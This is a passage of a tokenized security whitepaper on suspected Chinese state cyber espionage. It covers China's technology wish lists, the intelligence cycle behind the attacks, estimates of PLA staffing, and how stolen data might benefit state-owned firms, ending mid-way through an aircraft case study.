"marine", "engineering", "technology", ",", "engineering", "processes", "for"], ["the", "defence", "industry"], ["Transportation", ".", "Construction", "and", "maintenance", "technology", ",", "high", "speed", "rail", ",", "energy"], ["efficient", "cars", ",", "traffic", "control", "systems", ",", "alternative", "fuel", "based", "cars"], ["Modern", "Service", "Industry", ".", "Next", "generation", "Internet", "technology", ",", "high", "performance"], ["computers", ",", "digital", "media", "content", "platforms", ",", "HD", "displays"], ["Population", "/", "Health", ".", "Treatment", "of", "diseases", ",", "medical", "processes"], ["Urbanisation", ".", "Green", "buildings", ",", "architectural", "energy", "efficiencies"], ["Public", "Security", ".", "Security", "warning", "systems", ",", "bio-safety", "measures"], ["Defence", ".", "[Classified]"], ["In", "addition", "to", "these", "areas", ",", "which", "already", "contain", "a", "lot", "of", "areas", "that", "targeted", "western"], ["companies", "operate", "in", ",", "there", "is", "a", "further", "list", "of", "16", "\u2018Major", "Special", "Projects\u2019", ".", "These", "projects", "are"], ["intended", "to", "add", "to", "the", "overall", "strength", "of", "China", ".", "Previous", "examples", "of", "such", "projects", "include"], ["the", "development", "of", "the", "hydrogen", "bomb", ",", "launching", "satellites", ",", "manned", "space", "flights", "and"], ["hybrid", "rice", ".", "They", "are", "intended", "also", "to", "be", "a", "source", "of", "national", "pride", ".", "If", "one", "can", "see", "the"], ["potential", "for", "cyber", "attack", "to", "enhance", "many", "of", "the", "areas", "outlined", "above", ",", "the", "list", "below"], ["gives", "even", "more", "scope", "for", "the", "targeted", "theft", "of", "data", "from", "companies", "and", "governments"], ["around", "the", "world:"], ["Core", "electronic", "components", ",", "high-end", "general", "use", "chips", "and", "basic", "software"], ["products"], ["Large-scale", "integrated", "circuit", "manufacturing", "equipment", "and", "techniques"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["11", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["New", "generation", "broadband", "wireless", "mobile", "communication", "networks"], ["Advanced", "numeric-controlled", "machinery", "and", "basic", "manufacturing", "technology"], ["Large-scale", "oil", "and", "gas", "exploration"], ["Large", "advanced", "nuclear", "reactors"], ["Water", "pollution", "control", "and", "treatment"], ["Breeding", "new", "varieties", "of", "genetically", "modified", "organisms"], ["Pharmaceutical", "innovation", "and", "development"], ["Control", "and", "treatment", "of", "AIDS", ",", "hepatitis", ",", "and", "other", "major", "diseases"], ["Large", "aircraft"], ["High-definition", "earth", "observation", "system"], ["Manned", "spaceflight", "and", "lunar", "probe", "programs"], ["Classified", "military", "projects", "(x3)"], ["If", "we", "take", "the", "Major", "Special", "Projects", "as", "a", "Chinese", "technology", "wish", "list", ",", "we", "can", "assume", "there"], ["are", "two", "different", "methods", "that", "could", "be", "used", "to", "achieve", "these", "goals", ".", "The", "first", "involves"], ["funding", "research", "programmes", "in", "universities", "and", "companies", ",", "educating", "people", "over", "the"], ["long", "term", "and", "encouraging", "a", "culture", "of", "research", ",", "development", "and", "innovation", "and", "an"], ["acceptance", "that", "achievements", "in", "some", "areas", "will", "fall", "short", "of", "expectation", "."], ["The", "second", "way", "of", "viewing", "the", "challenge", "is", "that", "much", "of", "this", "technology", "already", "exists", "in"], ["the", "rest", "of", "the", "world", ",", "is", "already", "proven", "and", "is", "(relatively)", "easy", "to", "obtain", ".", "Far", "easier", "to", "steal"], ["the", "work", "of", "others", ",", "re-engineer", "it", ",", "improve", "it", "if", "practicable", "and", "necessary", "and", "be", "seen", "to", "be"], ["contributing", "to", "the", "progression", "of", "the", "Chinese", "state;", "and", "to", "do", "so", "may", "also", "be", "personally"], ["rewarding", "for", "members", "of", "the", "Party", ".", "Failure", "to", "achieve", "these", "goals", "would", "almost", "certainly"], ["be", "seen", "as", "unacceptable", "."], ["At", "Risk"], ["The", "companies", "that", "generate", "the", "target", "information", "are", "not", "the", "only", "ones", "at", "risk", ".", "We", "can"], ["also", "assume", "that", "the", "companies", "that", "support", "these", "areas", "\u2013", "lawyers", ",", "sub-contractors", ","], ["outsourced", "suppliers", "and", "any", "government", "departments", "with", "links", "to", "these", "firms", ",", "would", "also"], ["be", "attacked", "as", "part", "of", "an", "effort", "to", "find", "supporting", "information", "."], ["So", "long", "as", "the", "product", "is", "intended", "for", "domestic", "consumption", "only", ",", "in", "many", "cases", "there", "are"], ["minimal", "problems", "for", "the", "company", "targeted", "to", "have", "to", "face", ".", "Many", "firms", "would", "be", "unwilling"], ["or", "unable", "to", "sell", "their", "products", "into", "China", "anyway", "\u2013", "either", "because", "of", "a", "lack", "of", "global"], ["distribution", "networks", ",", "or", "because", "of", "export", "restrictions", ",", "in", "the", "case", "of", "sensitive", "military"], ["technologies", ",", "so", "the", "sale", "of", "an", "identical", ",", "stolen", "product", "would", "not", "directly", "harm", "their"], ["business", "."], ["For", "example", ",", "a", "company", "that", "makes", "hi-tech", "export", "controlled", "widgets", "for", "the", "US", "military", "is"], ["unlikely", "to", "be", "able", "to", "sell", "its", "product", "in", "China", "to", "the", "Chinese", "military", ".", "In", "any", "case", ",", "the"], ["Chinese", "military", "would", "probably", "prefer", "to", "buy", "a", "Chinese", "product", ".", "If", "the", "widget", "designs", "are"], ["stolen", "and", "a", "Chinese", "company", "makes", "the", "exact", "same", "widget", ",", "protected", "by", "a", "Chinese"], ["patent", ",", "the", "end", "product", "could", "be", "sold", "to", "the", "PLA", ".", "While", "the", "original", "manufacturer", "may"], ["rightly", "be", "concerned", "by", "this", ",", "the", "company", "would", "not", "suffer", "financially", ".", "Until", ",", "that", "is", ",", "the"], ["product", "made", "by", "the", "Chinese", "firm", "is", "offered", "for", "sale", "around", "the", "world", "at", "a", "much", "cheaper"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["12", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["price", "than", "that", "for", "which", "the", "original", "product", "is", "sold", ",", "because", "the", "Chinese", "firm", "has", "not"], ["needed", "to", "fund", "R&D", ".", "At", "this", "point", ",", "buyers", "who", "simply", "want", "a", "widget", "that", "works", "will", "buy", "the"], ["cheaper", "one", "."], ["The", "National", "Outline", "document", "goes", "on", "to", "specify", "\u2018Frontier", "Technologies\u2019:", "areas", "such", "as"], ["biotech", ",", "IT", ",", "advanced", "materials", "and", "manufacturing", "technologies", ",", "energy", "and", "marine"], ["technology", ",", "lasers", "and", "(again)", "aerospace", ",", "all", "areas", "in", "which", "the", "West", "has", "traditionally"], ["excelled", "and", "China", "has", "lagged", "behind", "."], ["The", "other", "key", "area", "that", "could", "lead", "to", "a", "requirement", "for", "cyber", "attacks", "is", "China\u2019s"], ["intelligence-gathering", "operation", ".", "This", "area", "is", "primarily", "controlled", "by", "the", "Party", "rather", "than", "the"], ["intelligence", "services", "themselves", ".", "Requirements", "in", "this", "area", "are", "likely", "to", "incorporate", "generic"], ["tasks", "to", "infiltrate", "and", "disrupt", "the", "activities", "of", "the", "Five", "Poisons", "(see", "above)", ",", "to", "gather", "military"], ["secrets", "from", "overseas", "and", "highlight", "politically", "useful", "information", ".", "That", "could", "be", ",", "for", "example", ","], ["intelligence", "on", "economic", "policies", "of", "the", "Eurozone", "countries", "regarding", "China", ",", "NATO", "plans"], ["for", "Afghanistan", ",", "international", "efforts", "to", "negotiate", "with", "North", "Korea", "or", "reports", "into", "human"], ["rights", "abuses", "."], ["The", "intelligence", "services", "will", "use", "all", "of", "their", "sources", "\u2013", "HUMINT", ",", "SIGINT", "and", "cyber", "\u2013", "to", "address"], ["these", "requirements", ".", "As", "the", "list", "is", "never", "published", "we", "can", "only", "guess", "at", "what", "it", "contains", ",", "but"], ["one", "may", "speculate", "that", "if", "intensive", "investigations", "focused", "on", "the", "detection", "of", "cyber", "attacks"], ["against", "the", "Five", "Poisons", "(the", "GhostNet14", "report", "was", "an", "excellent", "start)", ",", "it", "is", "likely", "that", "the"], ["same", "malware", "and", "infrastructure", "would", "be", "revealed", "to", "have", "been", "deployed", "."], ["http://www", ".", "scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-CyberEspionage-Network"], ["14"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["13", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["How", "Does", "it", "Happen", "?"], ["If", "we", "consider", "only", "the", "Chinese", "cyber", "attacks", "that", "have", "been", "reported", "we", "are", "only", "looking"], ["at", "the", "tip", "of", "the", "iceberg", ".", "First", ",", "we", "tend", "only", "to", "see", "reports", "of", "British", "or", "American", "firms", "being"], ["attacked", ",", "and", "we", "know", "that", "only", "a", "tiny", "minority", "of", "incidents", "are", "reported", ",", "because", "firms", "are"], ["either", "unaware", "they", "have", "been", "attacked", "or", "are", "afraid", "that", "publicising", "an", "incident", "will"], ["damage", "their", "brand", ",", "their", "company", "value", "or", "their", "personal", "careers", ".", "It", "is", "also", "likely", "that", "there"], ["is", "a", "huge", "number", "of", "small", "to", "medium", "sized", "enterprises", "around", "the", "world", "that", "have", "no", "idea"], ["that", "their", "crown", "jewels", "have", "been", "stolen", "."], ["Governments", "are", "unlikely", "to", "admit", "having", "lost", "data", "or", "to", "accuse", "China", "directly", ",", "for", "fear", "of"], ["risking", "negative", "political", "and", "economic", "consequences", ".", "Individual", "victims", "living", "in", "China", "will"], ["be", "unable", "to", "complain", "at", "the", "intrusion", "to", "their", "privacy", ",", "while", "those", "outside", "China", "may", "have"], ["little", "recourse", "to", "any", "organisation", "which", "would", "take", "their", "claims", "seriously", "."], ["To", "map", "out", "the", "process", "and", "try", "to", "think", "about", "the", "scale", "of", "the", "attacks", "we", "must", "start", "with", "a"], ["classic", "diagram", "of", "the", "intelligence", "cycle", "."], ["Setting", "Requirements"], ["As", "we", "have", "already", "seen", ",", "China", "has", "no", "issue", "in", "identifying", "requirements", ".", "These", "lie", "across", "the"], ["industrial", ",", "social", "and", "economic", "spectrum", "and", "represent", "the", "results", "of", "a", "mammoth", "effort", "to"], ["identify", "weaknesses", "and", "areas", "for", "further", "development", ".", "Given", "that", "the", "requirements", "are"], ["largely", "focussed", "around", "technical", ",", "economic", "and", "commercial", "development", "rather", "than"], ["social", "development", "it", "is", "fair", "to", "expect", "that", "this", "exercise", "was", "not", "conducted", "by", "government"], ["alone", ",", "but", "must", "have", "been", "supplemented", "by", "private", "sector", "(so", "far", "as", "there", "is", "one)", "."], ["However", ",", "the", "setting", "of", "requirements", "covers", "many", "more", "areas", "than", "just", "cyber", ",", "so", "it", "would"], ["not", "be", "correct", "to", "regard", "this", "effort", "as", "having", "been", "conducted", "simply", "to", "support", "electronic"], ["attacks", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["14", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Planning", "and", "Direction"], ["This", "is", "where", "things", "get", "a", "little", "bit", "complicated", ".", "Planning", "and", "direction", "activities", "take", "place"], ["on", "multiple", "levels", "\u2013", "at", "a", "Party", "level", ",", "regional", "level", ",", "local", "level", ",", "within", "every", "key", "government"], ["department", ",", "inside", "every", "company", "with", "a", "stake", "in", "fulfilling", "the", "requirements;", "and", "especially"], ["within", "the", "military", ",", "who", "evidence", "suggests", "are", "behind", "the", "bulk", "of", "targeted", "attacks", "."], ["Collection"], ["This", "area", "covers", "the", "whole", "process", "of", "target"], ["identification", ",", "malware", "development", ",", "crafting", "the"], ["attacks", ",", "designing", "the", "social", "engineering", ",", "initiating"], ["attacks", ",", "controlling", "implants", ",", "escalating", "privileges", "on"], ["the", "victim", "network", ",", "uploading", "further", "tools", "to", "maintain"], ["and", "develop", "access", ",", "finding", "and", "exfiltrating", "data", "of"], ["interest", ",", "and", "cleaning", "up", "traces", "of", "the", "attack", "to", "hinder"], ["investigations", "."], ["It", "also", "requires", "infrastructure", "(owned", "or", "stolen)", "to", "be"], ["constructed", "to", "support", "the", "attack", ",", "IP", "addresses", "or"], ["domain", "names", "updated", "into", "the", "implants", ",", "training", "of"], ["operators", ",", "language", "skills", ",", "management", "and", "some"], ["form", "of", "quality", "control", "process", "to", "enable", "some", "visibility"], ["over", "how", "well", "attacks", "are", "progressing", "."], ["While", "much", "of", "the", "attack", "process", "can", "be", "automated"], ["or", "simplified", "so", "it", "can", "be", "delegated", "to", "less", "technically"], ["adept", "operators", ",", "the", "scale", "of", "the", "attack", "is", "such", "that"], ["many", "skilled", "hackers", "will", "be", "needed", "in", "an", "advisory", "capacity", ",", "to", "conduct", "manual", "elements"], ["of", "the", "attack", ",", "to", "maintain", "a", "development", "program", "and", ",", "in", "some", "cases", ",", "to", "share", "details", "of"], ["the", "latest", "attack", "vectors", "and", "vulnerabilities", "with", "those", "tasked", "with", "cyber", "defence", "to", "protect"], ["Chinese", "systems", "from", "similar", "attacks", ".", "There", "will", "also", "almost", "certainly", "be", "an", "administration"], ["process", "that", "logs", "attacks", "and", "targets", ",", "collates", "information", "on", "target", "systems", ",", "feeds", "data", "into"], ["some", "form", "of", "risk", "assessment", "and", "ensures", "that", "all", "ongoing", "attacks", "are", "focussed", "on", "the"], ["attainment", "of", "a", "specific", "requirement", ".", "This", "is", "no", "small", "operation", "."], ["Processing", "and", "Exploitation"], ["If", "1", ",", "000", "attacks", "are", "successful", "and", "all", "result", "in", "large", "amounts", "of", "data", "being", "stolen", "from"], ["compromised", "systems", ",", "that", "data", "needs", "to", "be", "put", "into", "a", "readable", "format", "(and", "decrypted", "if"], ["necessary)", ",", "made", "searchable", ",", "stored", "in", "a", "database", "and", "translated", "into", "Chinese", "\u2013", "and", "all"], ["these", "operations", "have", "to", "be", "carried", "out", "in", "bulk", "and", "in", "real", "time", "or", "something", "close", "to", "it", ",", "to"], ["allow", "that", "information", "to", "be", "used", "as", "quickly", "and", "effectively", "as", "possible", ".", "Of", "course", ",", "the"], ["actual", "number", "of", "active", "compromises", "at", "any", "one", "time", "is", "likely", "to", "be", "many", "magnitudes"], ["higher", "than", "1", ",", "000!"], ["Analysis", "and", "Production"], ["The", "first", "problem", "with", "analysing", "bulk", "amounts", "of", "data", "translated", "from", "other", "languages", "is"], ["that", "machine", "translation", "is", "often", "of", "low", "quality", ",", "particularly", "for", "data", "such", "as", "emails", "written"], ["using", "more", "colloquial", "terms", ".", "The", "second", "issue", "is", "that", "a", "large", "proportion", "of", "the", "stolen"], ["documents", "is", "likely", "to", "be", "of", "a", "highly", "technical", "nature:", "If", "you", "steal", "documents", "from", "a", "widget"], ["maker", "then", "you", "need", "at", "least", "a", "basic", "knowledge", "of", "widgets", "to", "be", "able", "to", "understand", "the"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["15", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["potential", "value", "of", "a", "document", "and", "how", "best", "to", "exploit", "it", ".", "If", "there", "is", "a", "lot", "of", "widget", "data", "you"], ["will", "need", "a", "lot", "of", "widget", "specialists", "or", "risk", "the", "data", "being", "out", "of", "date", "by", "the", "time", "it", "is"], ["analysed", ".", "And", "just", "because", "someone", "understands", "widgets", "doesn\u2019t", "mean", "that", "they"], ["understand", "gizmos", ",", "so", "another", "team", "will", "be", "required", "to", "look", "at", "that", "data", "\u2013", "and", "so", "on", ".", "These"], ["analysts", "will", "provide", "feedback", "to", "operators", ",", "perhaps", "saying", "\u2018get", "more\u2019", ",", "or", "\u2018this", "is", "no", "good", ","], ["get", "something", "else\u2019", ".", "They", "may", "also", "provide", "search", "terms", "for", "documents", ".", "All", "this", "analysis", "will"], ["then", "need", "to", "be", "written", "up", "into", "reports", "which", "should", "try", "to", "protect", "the", "source", "of", "the"], ["information", "."], ["Dissemination"], ["If", "the", "information", "is", "to", "be", "useful", "the", "reporting", "process", "has", "to", "be", "fast", ",", "in", "order", "to", "get", "useful"], ["information", "to", "the", "right", "people", ".", "Dissemination", "of", "intelligence", "reports", "to", "security", "and"], ["intelligence", "officers", "should", "be", "straightforward", "as", "all", "people", "in", "the", "process", "will", "have"], ["clearances", ".", "But", "we", "can", "assume", "(although", "there", "are", "no", "guarantees)", "that", "this", "information", "is"], ["highly", "classified", "and", "dissemination", "is", "carefully", "controlled", ",", "which", "makes", "disseminating", "it", "to"], ["government", "officials", "a", "little", "more", "difficult", ",", "especially", "if", "those", "officials", "are", "based", "outside"], ["Beijing", ",", "because", "encrypted", "links", "or", "maybe", "a", "network", "of", "trusted", "couriers", "will", "be", "required", "to"], ["transport", "the", "reports", "."], ["The", "most", "difficult", "task", "will", "be", "delivering", "reports", "on", "commercial", "or", "technical", "development", "to"], ["the", "right", "people", ".", "The", "most", "trusted", "individuals", "will", "be", "at", "the", "top", "of", "organisations", ",", "probably", "as"], ["a", "result", "of", "their", "loyalty", "to", "the", "Party", ",", "but", "these", "are", "not", "necessarily", "the", "people", "able", "to"], ["understand", ",", "interpret", "and", "exploit", "the", "information", "contained", "within", "the", "report", ".", "So", "the", "report"], ["or", "elements", "of", "it", "must", "be", "passed", "downwards", "to", "those", "who", "do", "understand", "it", ".", "This", "means", "a"], ["significant", "increase", "in", "the", "number", "of", "people", "who", "are", "aware", ",", "which", "represents", "a", "significant"], ["risk", ".", "The", "Party", "must", "also", "decide", "to", "which", "companies", "it", "will", "pass", "information", "\u2013", "if", "five"], ["companies", "all", "produce", "widgets", "do", "you", "give", "the", "information", "on", "next", "generation", "widgets", "to"], ["one", "of", "them", ",", "or", "all", "of", "them", "?", "We", "will", "look", "at", "one", "way", "the", "Party", "addresses", "this", "issue", "below", "."], ["Getting", "the", "dissemination", "right", "should", "in", "turn", "generate", "more", "requirements", "and", "help", "to"], ["create", "a", "more", "refined", "requirement", "to", "feed", "back", "into", "the", "process", "and", "drive", "the", "next", "data"], ["acquisition", "cycle", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["16", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["The", "Scale", "of", "the", "Operation"], ["Most", "authorities", "attribute", "responsibility", "for", "cyber", "attacks", "and", "intelligence", "gathering", "to", "the"], ["Third", "Department", "of", "the", "PLA", "(3PLA)", "and", "accept", "that", "the", "Second", "Department", "(2PLA)", "may"], ["also", "have", "a", "role", "to", "play", ".", "Accurate", "figures", "for", "the", "size", "of", "these", "Departments", "are", "not", "publicly"], ["available", ",", "but", "the", "more", "success", "the", "attackers", "have", ",", "the", "more", "funding", "they", "are", "likely", "to", "get"], ["for", "further", "attacks", ".", "Other", "branches", "of", "the", "military", "may", "then", "see", "the", "possibility", "for", "increased"], ["funding", "and", "political", "glory", "by", "competing", "in", "the", "same", "space", ".", "One", "very", "thorough", "report", "by"], ["Project", "204915", ",", "a", "group", "who", "analyse", "the", "Asian", "security", "landscape", "among", "other", "topics", ","], ["details", "the", "Third", "Department", "of", "the", "PLA", "and", "outlines", "their", "broader", "activities", "and", "structure", "."], ["Their", "role", "is", "primarily", "SIGINT", "aimed", "at", "intercepting", "radio", ",", "telecoms", "and", "email"], ["communications", "and", "reporting", "the", "content", "as", "intelligence", ".", "The", "report", "contains", "a", "figure"], ["(though", "they", "make", "clear", "this", "is", "estimated)", "of", "130", ",", "000", "people", "being", "part", "of", "the", "3PLA", ".", "The"], ["2PLA", "is", "concerned", "with", "Human", "Intelligence", "(HUMINT)", "as", "well", "as", "SIGINT", "to", "support", "its", "military"], ["intelligence", "mission", "."], ["So", "trying", "to", "work", "out", "how", "many", "people", "are", "involved", "in", "this", "process", "is", "only", "ever", "going", "to", "be"], ["based", "on", "educated", "guesswork", ".", "If", "we", "look", "simply", "at", "the", "effort", "in", "the", "3PLA", ",", "put", "aside", "all", "other"], ["groups", "for", "now", "and", "take", "the", "figure", "of", "130", ",", "000", "as", "true", ",", "there", "is", "a", "very", "large", "pool", "of", "available"], ["personnel", "who", "are", "able", "to", "support", "cyber", "operations", ".", "However", ",", "as", "we", "have", "stated", "above", ","], ["the", "3PLA", "has", "a", "remit", "broader", "than", "simply", "cyber", "and", "other", "areas", "are", "far", "more", "established", "."], ["Numbers", "working", "in", "the", "requirements", "capture", "and", "planning", "area", "are", "probably", "in", "the", "low"], ["hundreds", ".", "Trying", "to", "gauge", "the", "size", "of", "the", "collection", "effort", "is", "difficult", "and", "requires", "a", "large"], ["margin", "of", "error", ".", "But", "it", "is", "fair", "to", "assume", "that", "several", "hundred", "people", "could", "do", "the", "target"], ["development", "work;", "around", "a", "hundred", "dedicated", "specialists", "could", "work", "on", "malware"], ["development", "(with", "the", "Chinese", "hacking", "community", "providing", "new", "tools", "at", "regular"], ["intervals);", "perhaps", "one", "or", "two", "thousand", "low", "level", "operators", "(the", "\u2018B\u2019", "team)", "supported", "by"], ["another", "few", "hundred", "with", "more", "advanced", "skills", "(the", "\u2018A\u2019", "team)", "who", "look", "after", "the", "most"], ["sensitive", "intrusions;", "an", "infrastructure", "team", "of", "a", "few", "dozen;", "and", "an", "operational", "security", "team"], ["of", "a", "few", "dozen", "more", "."], ["Then", "come", "the", "processing", "and", "analysis", "experts:", "potentially", "a", "pool", "of", "several", "thousand"], ["specialists", "able", "to", "read", "and", "write", "in", "a", "wide", "variety", "of", "languages;", "hundreds", "if", "not", "thousands"], ["of", "specialists", "in", "all", "of", "the", "fields", "of", "information", "being", "stolen", "\u2013", "politics", ",", "economics", ",", "engineering", ","], ["IT", ",", "science", ",", "etc;", "hundreds", "of", "report", "writers;", "dozens", "of", "people", "processing", "data;", "and", "dozens"], ["more", "administering", "the", "whole", "process", "."], ["If", "these", "very", "rough", "figures", "are", "anywhere", "close", "to", "reality", ",", "at", "least", "7", ",", "000", "people", "are", "directly"], ["involved", "in", "hacking", "foreign", "computer", "networks", "for", "the", "Chinese", "military", "and", "processing", "the"], ["output", "of", "those", "attacks", ".", "Potentially", "many", "thousands", "more", "see", "the", "reporting", "and", "are", "aware"], ["of", "the", "sorts", "of", "results", "generated", "by", "these", "operations", "."], ["15http://project2049", ".", "net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["17", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Profiting", "from", "the", "Product"], ["So", "who", "is", "most", "likely", "to", "profit", "from", "the", "information", "being", "gathered", "through", "these", "attacks", "?"], ["The", "political", ",", "economic", "and", "intelligence", "reporting", "has", "a", "clear", "audience", ",", "but", "deciding", "who"], ["the", "commercial", "intelligence", "should", "be", "passed", "to", "presents", "a", "more", "taxing", "problem", ".", "Which"], ["companies", "receive", "this", "kind", "of", "assistance", "?", "The", "answer", "may", "lie", "in", "the", "particular", "brand", "of"], ["capitalism", "which", "China"], ["practices", "."], ["China", "is", "no", "longer", "the"], ["planned", "economy", "it", "once"], ["was", "and", "some", "Chinese"], ["companies", "are", "now", "among"], ["the", "largest", "in", "the", "world", ".", "But"], ["this", "is", "not", "capitalism", "as", "we"], ["know", "it", "and", "these", "companies"], ["are", "far", "from", "being", "truly"], ["\u2018private\u2019", ".", "All", "the", "largest"], ["companies", "in", "China", "are", "State"], ["Owned", "Enterprises", "(SOEs)", "in"], ["which", "the", "state", "is", "the", "largest"], ["(or", "only)", "shareholder", ".", "The"], ["state", "can", "and", "does", "change", "company", "board", "members", "at", "will", "and", "members", "of", "the", "armed"], ["forces", "are", "routinely", "brought", "into", "senior", "management", "roles", ".", "But", "in", "addition", "to", "simply"], ["appointing", "the", "heads", "of", "companies", ",", "the", "Party", "also", "has", "a", "final", "say", "over", "the", "strategic"], ["direction", "of", "each", "company", ",", "business", "planning", "processes", "and", "the", "size", "of", "salaries", "paid", "to"], ["employees", ".", "After", "all", ",", "if", "companies", "are", "seen", "to", "be", "profiting", "unfairly", "at", "the", "expense", "of", "the"], ["workers", "that", "could", "lead", "to", "political", "unrest", "."], ["There", "are", "currently", "117", "companies", "classed", "as", "SOEs", "and", "under", "the", "control", "of", "the", "Stateowned", "Assets", "Supervision", "and", "Administration", "Commission", "(SASAC)", ",", "the", "primary", "shareholder"], ["in", "these", "companies", ".", "To", "give", "some", "idea", "of", "the", "scale", "of", "SOEs", ",", "they", "now", "comprise", "80%", "of", "the"], ["value", "of", "China\u2019s", "stock", "market", ".", "Yet", "in", "the", "last", "10", "years", ",", "the", "number", "of", "SOEs", "has", "almost", "halved"], ["as", "SASAC", "has", "pushed", "through", "mergers", "of", "companies", "with", "similar", "strengths", "to", "consolidate"], ["the", "overall", "power", "of", "these", "companies", "in", "various", "sectors", "and", "make", "them", "more", "competitive"], ["outside", "China", ".", "SASAC", "works", "alongside", "the", "Communist", "Party\u2019s", "Organisation", "Department", ","], ["which", "acts", "as", "a", "human", "resources", "department", "and", "makes", "certain", "that", "those", "running", "these"], ["businesses", "care", "every", "bit", "as", "much", "(if", "not", "more)", "about", "pleasing", "Party", "bosses", "as", "they", "do"], ["about", "their", "success", "in", "business", "."], ["In", "addition", "to", "the", "Party\u2019s", "input", "to", "the", "strategies", "pursued", "by", "these", "companies", ",", "the", "state", "is", "also"], ["instrumental", "in", "guiding", "them", "to", "financial", "success", "by", "other", "means", ".", "Most", "significantly", "it"], ["arranges", "cheap", "lines", "of", "credit", ",", "allowing", "companies", "to", "borrow", "money", "for", "expansion;", "and"], ["provides", "a", "ready-made", "market", "for", "the", "company", "\u2013", "the", "Party", "has", "the", "ability", "to", "block"], ["competitors", "from", "any", "industry", "or", "to", "introduce", "policies", "which", "make", "competitors", "more"], ["expensive", ".", "The", "state", "can", "also", "provide", "considerable", "human", "resources", "if", "a", "particular"], ["company", "or", "industry", "needs", "to", "increase", "production", "suddenly:", "large", "pools", "of", "labour", "in", "China"], ["work", "for", "the", "state", "rather", "than", "companies", "and", "so", "form", "a", "mobile", "and", "flexible", "workforce", ".", "But", "if"], ["at", "the", "end", "of", "the", "day", "the", "products", "or", "services", "a", "company", "offers", "are", "outdated", "or", "of", "poor"], ["quality", ",", "that", "company", "will", "fail", ".", "The", "Party", "has", "a", "vested", "interest", "in", "every", "SOE", "performing", "well"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["18", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["and", "becoming", "a", "national", "or", "global", "champion", "in", "its", "sector", ",", "so", "it", "may", "be", "willing", "to", "extend"], ["help", "through", "the", "leveraging", "of", "intelligence", "sources", ".", "Note", "the", "list", "of", "companies", "and", "sectors"], ["in", "Appendix", "A:", "it", "is", "clear", "that", "the", "companies", "on", "the", "list", "all", "have", "interests", "in", "areas", "which", "will"], ["support", "the", "Five", "Year", "Plan", "and", "Indigenous", "Innovation", "."], ["Hypothetical", "Case", "Study:", "Aircraft", "Construction"], ["One", "good", "example", "of", "how", "the", "Party", "could", "use", "its", "intelligence", "collection", "methods", "to", "benefit"], ["an", "SOE", "is", "seen", "in", "the", "case", "of", "COMAC16", ",", "the", "Commercial", "Aircraft", "Corporation", "of", "China", "."], ["COMAC", "is", "currently", "trying", "to", "build", "a", "large", "aircraft", "to", "compete", "with", "the", "likes", "of", "Boeing", "and"], ["Airbus", ".", "In", "an", "excellent", "in-depth", "paper", "on", "Indigenous", "Innovation17", ",", "the", "US", "Chamber", "of"], ["Commerce", "and", "strategic", "consulting", "firm", "ACPO", "Worldwide18", "detail", "the", "desire", "of", "China", "to"], ["build", "an", "aircraft", "since", "the", "crash", "(and", "subsequent", "re-engineering)", "of", "a", "Pakistan", "Airlines"], ["Boeing", "707", "in", "1971", ".", "The", "re-engineered", "plane", "named", "the", "Yun-10", "was", "a", "complete", "failure", "as"], ["China", "did", "not", "at", "that", "time", "possess", "all", "the", "necessary", "technology", "required", "to", "make", "it", "a"], ["success", "."], ["With", "a", "rise", "in", "the", "use", "of", "air", "transport", "within", "China", ",", "domestic", "carriers", "are", "being", "forced", "to", "buy"], ["foreign", "aircraft", "at", "enormous", "cost", ",", "whereas", "a", "home-grown", "aircraft", "could", "be", "sold", "much", "more"], ["cheaply", ".", "The", "COMAC", "C91919", "is", "designed", "to", "rival", "the", "Boeing", "737", "and", "Airbus", "A320", "and"], ["planned", "to", "be", "operating", "by", "2015", ",", "and", "to", "encourage", "foreign", "companies", "to", "share", "their"], ["technology", ",", "China", "has", "promised", "access", "to", "the", "market", ".", "Companies", "including", "Parker"], ["Aerospace", ",", "General", "Electric", ",", "Honeywell", "and", "Goodrich", "have", "all", "signed", "up", ".", "Whether", "they"], ["benefit", "from", "this", "move", "in", "the", "long", "term", ",", "or", "are", "instead", "encouraged", "to", "leave", "once", "they", "have"], ["been", "bled", "dry", "of", "useful", "information", ",", "remains", "to", "be", "seen", ".", "But", "for", "all", "the", "help", "they", "are", "getting", ","], ["Chinese", "engineers", "are", "not", "yet", "able", "to", "access", "the", "technology", "developed", "by", 